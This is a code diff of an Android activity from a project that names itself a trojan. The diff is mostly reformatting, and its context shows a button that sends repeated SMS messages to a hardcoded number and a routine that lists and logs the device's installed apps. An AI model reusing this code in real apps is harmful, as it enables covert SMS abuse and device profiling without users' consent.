@@ -18,7 +18,7 @@ import trojan.android.android_trojan.R;
 /**
  * Created by Jean-Laurent on 26/11/2014.
  */
-public class first_activity extends Activity {
+public class FIrstActivity extends Activity {
     private static final String TAG = "first_activity";
     Context context;
     private Button button01;
@@ -36,9 +36,10 @@ public class first_activity extends Activity {
 
             @Override
             public void onClick(View v) {
-                for(int i = 1; i <= 3; i++) {
+                for (int i = 1; i <= 3; i++) {
                     SendSMS("0628470850", "Test Message 2.1");
-                }}
+                }
+            }
         });
 
         button02.setOnClickListener(new View.OnClickListener() {
@@ -50,7 +51,7 @@ public class first_activity extends Activity {
 
     }
 
-    public void SendSMS (String numTelephone, String message){
+    public void SendSMS(String numTelephone, String message) {
         // permet de voir dans les log si la fct marche
         Log.d(TAG, "SendSMS");
         SmsManager sms = SmsManager.getDefault();
@@ -64,6 +65,7 @@ public class first_activity extends Activity {
         private String versionName = "";
         private int versionCode = 0;
         private Drawable icon;
+
         private void prettyPrint() {
             Log.d(TAG, appname + "\t" + pname + "\t" + versionName + "\t" + versionCode);
         }
@@ -72,7 +74,7 @@ public class first_activity extends Activity {
     private ArrayList<PInfo> getPackages() {
         ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
         final int max = apps.size();
-        for (int i=0; i<max; i++) {
+        for (int i = 0; i < max; i++) {
             apps.get(i).prettyPrint();
         }
         return apps;
@@ -81,10 +83,10 @@ public class first_activity extends Activity {
     private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
         ArrayList<PInfo> res = new ArrayList<PInfo>();
         List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
-        for(int i=0;i<packs.size();i++) {
+        for (int i = 0; i < packs.size(); i++) {
             PackageInfo p = packs.get(i);
             if ((!getSysPackages) && (p.versionName == null)) {
-                continue ;
+                continue;
             }
             PInfo newInfo = new PInfo();
             newInfo.appname = p.applicationInfo.loadLabel(getPackageManager()).toString();
